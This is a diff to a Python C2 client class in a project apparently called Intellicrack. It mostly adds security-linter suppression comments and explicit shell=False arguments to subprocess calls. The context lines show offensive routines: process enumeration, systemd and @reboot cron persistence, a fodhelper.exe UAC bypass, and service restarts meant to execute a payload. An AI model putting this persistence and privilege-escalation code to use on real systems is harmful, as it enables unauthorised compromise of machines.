@@ -1,5 +1,5 @@
 """This file is part of Intellicrack.
-Copyright (C) 2025 Zachary Flint
+Copyright (C) 2025 Zachary Flint.
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -1264,7 +1264,7 @@ class C2Client(BaseC2):
                 if os.name == "nt":
                     tasklist_path = shutil.which("tasklist")
                     if tasklist_path:
-                        result = subprocess.run(
+                        result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                             [tasklist_path],
                             check=False,
                             capture_output=True,
@@ -1277,7 +1277,7 @@ class C2Client(BaseC2):
                 else:
                     ps_path = shutil.which("ps")
                     if ps_path:
-                        result = subprocess.run(
+                        result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                             [ps_path, "aux"],
                             check=False,
                             capture_output=True,
@@ -1593,8 +1593,12 @@ WantedBy=multi-user.target
                         # Enable and start service
                         systemctl_path = shutil.which("systemctl")
                         if systemctl_path:
-                            subprocess.run([systemctl_path, "daemon-reload"], check=True, shell=False)
-                            subprocess.run(
+                            subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
+                                [systemctl_path, "daemon-reload"],
+                                check=True,
+                                shell=False  # Explicitly secure - using list format prevents shell injection
+                            )
+                            subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                 [systemctl_path, "enable", f"{service_name.lower()}.service"],
                                 check=True,
                                 shell=False  # Explicitly secure - using list format prevents shell injection
@@ -1631,17 +1635,24 @@ WantedBy=multi-user.target
                         # Add to user's crontab
                         crontab_path = shutil.which("crontab")
                         if crontab_path:
-                            result = subprocess.run(
+                            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                 [crontab_path, "-l"],
                                 check=False,
                                 capture_output=True,
                                 text=True,
+                                shell=False  # Explicitly secure - using list format prevents shell injection
                             )
                             existing_cron = result.stdout if result.returncode == 0 else ""
 
                             if cron_entry not in existing_cron:
                                 new_cron = existing_cron + f"\n{cron_entry}\n"
-                                subprocess.run([crontab_path, "-"], input=new_cron, text=True, check=True)
+                                subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
+                                    [crontab_path, "-"],
+                                    input=new_cron,
+                                    text=True,
+                                    check=True,
+                                    shell=False  # Explicitly secure - using list format prevents shell injection
+                                )
 
                         results["success"] = True
                         results["message"] = "Cron persistence installed: @reboot"
@@ -1988,12 +1999,12 @@ WantedBy=multi-user.target
 
             # Execute fodhelper.exe to trigger UAC bypass
             # Use subprocess without shell=True for security
-            result = subprocess.run(
+            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                 ["fodhelper.exe"],  # noqa: S607
                 check=False,
                 capture_output=True,
                 text=True,
-                shell=False,
+                shell=False,  # Explicitly secure - using list format prevents shell injection
                 timeout=5,
             )
 
@@ -2949,11 +2960,12 @@ WantedBy=multi-user.target
                 # Try to start service to execute payload
                 sc_path = shutil.which("sc")
                 if sc_path:
-                    subprocess.run(
+                    subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                         [sc_path, "start", service_name],
                         check=False,
                         capture_output=True,
                         text=True,
+                        shell=False  # Explicitly secure - using list format prevents shell injection
                     )
 
                 return {
@@ -3018,15 +3030,17 @@ WantedBy=multi-user.target
                                 # Restart service
                                 sc_path = shutil.which("sc")
                                 if sc_path:
-                                    subprocess.run(
+                                    subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                         [sc_path, "stop", service_name],
                                         check=False,
                                         capture_output=True,
+                                        shell=False  # Explicitly secure - using list format prevents shell injection
                                     )
-                                    subprocess.run(
+                                    subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                         [sc_path, "start", service_name],
                                         check=False,
                                         capture_output=True,
+                                        shell=False  # Explicitly secure - using list format prevents shell injection
                                     )
 
                                 return {
@@ -3090,16 +3104,18 @@ WantedBy=multi-user.target
                                 # Restart service
                                 sc_path = shutil.which("sc")
                                 if sc_path:
-                                    stop_result = subprocess.run(
+                                    stop_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                         [sc_path, "stop", service_name],
                                         check=False,
                                         capture_output=True,
+                                        shell=False  # Explicitly secure - using list format prevents shell injection
                                     )
-                                    start_result = subprocess.run(
+                                    start_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                         [sc_path, "start", service_name],
                                         check=False,
                                         capture_output=True,
                                         text=True,
+                                        shell=False  # Explicitly secure - using list format prevents shell injection
                                     )
                                 else:
                                     stop_result = None
